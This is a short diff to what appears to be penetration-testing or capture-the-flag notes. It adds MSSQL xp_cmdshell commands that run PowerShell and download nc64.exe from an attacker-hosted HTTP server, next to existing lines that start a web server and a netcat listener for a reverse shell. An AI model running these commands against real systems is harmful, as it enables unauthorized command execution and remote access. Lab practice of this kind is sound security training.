@@ -110,6 +110,11 @@ sudo python3 -m http.server 80
 
 sudo nc -lvnp 443
 
+
+SQL> xp_cmdshell "powershell -c pwd"
+SQL> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget
+http://10.129.14.79/nc64.exe -outfile nc64.exe"
+
 ------------------------------
 
 gobuster
